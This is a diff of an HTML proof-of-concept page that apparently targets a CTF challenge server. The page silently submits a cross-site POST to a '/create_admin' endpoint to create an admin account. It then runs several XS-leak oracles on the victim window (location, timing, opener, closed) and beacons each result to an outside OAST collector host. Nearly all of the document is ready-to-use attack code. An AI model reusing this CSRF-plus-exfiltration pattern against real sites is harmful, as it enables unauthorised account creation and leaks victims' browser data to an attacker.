@@ -2,27 +2,34 @@
 <html>
 <head>
   <meta charset="UTF-8">
-  <title>redirect / token leak PoC</title>
+  <title>XS-Leak create_admin PoC</title>
 </head>
 <body>
 
 <script>
+/* ================= CONFIG ================= */
+
 const TARGET = "https://tasks.goidactf.ru:20385/create_admin";
 const OAST   = "https://zzvqvwrdwxfyihbbkymvn6unl6cm7zezt.oast.fun";
-const ADMIN  = "evil_admin";
+const ADMIN  = "evil_admin_" + Math.random().toString(36).slice(2);
 
-/* helper */
-const log = d => navigator.sendBeacon(OAST + "/leak?d=" + encodeURIComponent(d));
+/* ================= HELPERS ================= */
 
-/*
- 1. redirect / window oracle
-*/
-const w = window.open("", "leakwin");
+const log = d =>
+  navigator.sendBeacon(
+    OAST + "/leak?d=" + encodeURIComponent(d)
+  );
 
+/* ================= ATTACK ================= */
+
+// окно-жертва
+const w = window.open("", "sink");
+
+// форма CSRF
 const f = document.createElement("form");
 f.method = "POST";
 f.action = TARGET;
-f.target = "leakwin";
+f.target = "sink";
 
 const i = document.createElement("input");
 i.name = "new_admin_login";
@@ -30,52 +37,38 @@ i.value = ADMIN;
 
 f.appendChild(i);
 document.body.appendChild(f);
+
+// тайминг
+const t0 = performance.now();
+
+// шлём POST
 f.submit();
 
-/*
- 2. window.closed oracle
-*/
+/* ================= ORACLES ================= */
+
+// 1️⃣ redirect / same-origin oracle
 setTimeout(() => {
-  log("closed=" + w.closed);
+  try {
+    log("href=" + w.location.href);
+  } catch (e) {
+    log("href=blocked");
+  }
 }, 3000);
 
-/*
- 3. window.name leak (часто забывают)
-*/
+// 2️⃣ timing oracle (redirect chain)
 setTimeout(() => {
-  let name;
-  try {
-    name = w.name;
-  } catch(e) {
-    name = "blocked";
-  }
-  log("window.name=" + name);
+  log("dt=" + (performance.now() - t0));
 }, 3500);
 
-/*
- 4. title-based XS-leak (timing)
-*/
-let start = performance.now();
+// 3️⃣ window replacement oracle
 setTimeout(() => {
-  let t;
-  try {
-    t = w.document.title;
-  } catch(e) {
-    t = "x-origin";
-  }
-  log("title=" + t + "|time=" + (performance.now() - start));
-}, 5000);
+  log("window=" + (w.opener ? "alive" : "replaced"));
+}, 4000);
 
-/*
- 5. fallback: detect redirect to attacker (open redirect)
-*/
+// 4️⃣ closed oracle (на всякий)
 setTimeout(() => {
-  try {
-    log("location=" + w.location.href);
-  } catch(e) {
-    log("location=blocked");
-  }
-}, 7000);
+  log("closed=" + w.closed);
+}, 4500);
 
 </script>
 
